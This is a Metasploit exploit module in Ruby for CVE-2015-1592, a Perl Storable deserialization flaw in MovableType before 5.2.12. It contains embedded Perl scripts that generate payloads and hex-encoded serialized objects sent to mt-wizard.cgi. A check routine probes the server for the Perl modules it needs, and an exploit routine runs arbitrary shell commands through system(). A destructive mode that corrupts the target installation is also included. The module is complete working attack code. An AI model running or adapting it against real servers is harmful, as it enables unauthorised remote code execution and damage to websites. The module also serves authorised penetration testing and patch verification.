##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SixApart MovableType Storable Perl Code Execution',
      'Description'    => %q{
          This module exploits a serialization flaw in MovableType before 5.2.12 to execute
          arbitrary code. The default nondesctructive mode depends on the server having
          the Object::MultiType and DateTime Perl modules installed in Perl's @INC paths.
          The destructive mode of operation uses only required MovableType dependencies,
          but it will noticeably corrupt the MovableType installation.
      },
      'Author'         =>
        [
          'John Lightsey',
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2015-1592' ],
          [ 'URL', 'https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html' ],
        ],
      'Privileged'     => false, # web server context
      'Payload'        =>
        {
          'DisableNops' => true,
          'BadChars'    => ' ',
          'Space'       => 1024,
        },
      'Compat'         =>
        {
          'PayloadType' => 'cmd'
        },
      'Platform'       => [ 'unix', 'linux' ],
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Feb 11 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('URI', [ true, "MoveableType cgi-bin directory path", "/cgi-bin/movabletype" ]),
      ], self.class)

    register_advanced_options(
      [
        OptBool.new('DESTRUCTIVE', [ false, 'Enable destructive attack method (more likely to succeed, but corrupts target system.)', false]),
      ]
    )
  end

=begin

#!/usr/bin/perl

# generate config parameters for injection checks

use Storable;

{

    package XXXCHECKXXX;

    sub STORABLE_thaw {
        return 1;
    }

    sub STORABLE_freeze {
        return 1;
    }

}

my $check_obj = bless { ignore => 'this' }, XXXCHECKXXX;
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $check_obj});
$frozen = unpack 'H*', $frozen;
print "LFI test for storable flaw is: $frozen\n";

{
    package DateTime;
    use overload '+' => sub { 'ignored' };
}

my $datetime_loader = bless \{}, DateTime;
$frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $datetime_loader});
$frozen = unpack 'H*', $frozen;
print "Module load test for DateTime presence is: $frozen\n";

{
    package Object::MultiType;
    use overload '+' => sub { 'ignored' };
}

my $object_multitype_loader = bless \{}, Object::MultiType;
$frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({x => $object_multitype_loader});
$frozen = unpack 'H*', $frozen;
print "Module load test for Obect::MultiType presence is: $frozen\n";

=end

  def check
    vprint_status("#{peer} - Sending storable test injection for XXXCHECKXXX.pm load failure")
    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt-wizard.cgi'),
        'vars_get' => {
          '__mode' => 'retry',
          'step'   => 'configure',
          'config' => '53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078'
        }
      }, 25)
    if (!res or res.code != 200 or res.body !~ /Can't locate XXXCHECKXXX\.pm/)
      vprint_status("#{peer} - Failed XXXCHECKXXX.pm load test");
      return Exploit::CheckCode::Safe
    end

    vprint_status("#{peer} - Sending storable test injection for DateTime presence")
    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt-wizard.cgi'),
        'vars_get' => {
          '__mode' => 'retry',
          'step'   => 'configure',
          'config' => '53455247000000000000000304080831323334353637380408080803010000001411084461746554696d650403000000000100000078'
        }
      }, 25)
    if (!res or res.code != 200 or res.body =~ /Can't locate DateTime\.pm/)
      vprint_status("#{peer} - Failed DateTime load test");
      return Exploit::CheckCode::Safe
    end

    vprint_status("#{peer} - Sending storable test injection for Object::MultiType presence")
    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt-wizard.cgi'),
        'vars_get' => {
          '__mode' => 'retry',
          'step'   => 'configure',
          'config' => '53455247000000000000000304080831323334353637380408080803010000001411114f626a6563743a3a4d756c7469547970650403000000000100000078'
        }
      }, 25)
    if (!res or res.code != 200 or res.body =~ /Can't locate Object\/MultiType\.pm/)
      vprint_status("#{peer} - Failed Object::MultiType load test");
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

=begin

#!/usr/bin/perl

# generate config parameter for RCE via Object::MultiType and Try::Tiny
# the generated value requires minor modification to insert the payload
# inside the system() call and resize the padding.

use Storable;

{
    package Object::MultiType;
    use overload '+' => sub { 'ingored' };
}

{
    package Object::MultiType::Saver;
}

{
    package DateTime;
    use overload '+' => sub { 'ingored' };
}

{
    package Try::Tiny::ScopeGuard;
}

my $try_tiny_loader = bless {}, 'DateTime';
my $multitype_saver = bless { c => 'MT::run_app' }, 'Object::MultiType::Saver';
my $multitype_coderef = bless \$multitype_saver, 'Object::MultiType';
my $try_tiny_executor = bless [$multitype_coderef, 'MT;print qq{Content-type: text/plain\n\n};system(q{});' . ('#' x 1025) . "\nexit;"], 'Try::Tiny::ScopeGuard';

my $data = [$try_tiny_loader, $try_tiny_executor];
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
$frozen = unpack 'H*', $frozen;
print "RCE payload requiring Object::MultiType and DateTime: $frozen\n";

=end

  def exploit
    config_payload = "53455247000000000000000304080831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b"
    config_payload <<  payload.raw.unpack('H*')[0]
    config_payload << "7d293b"
    config_payload << "23" * (1025 - payload.raw.length)
    config_payload << "0a657869743b"

    print_status("#{peer} - Sending payload (#{payload.raw.length} bytes)")

    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt-wizard.cgi'),
        'vars_get' => {
          '__mode' => 'retry',
          'step'   => 'configure',
          'config' => config_payload
        }
      }, 25)

    if (res and res.code == 200)
      print_status("Successfully sent exploit request")
    else
      fail_with(Failure::Unknown, "Error sending exploit request")
    end

    handler
  end

end
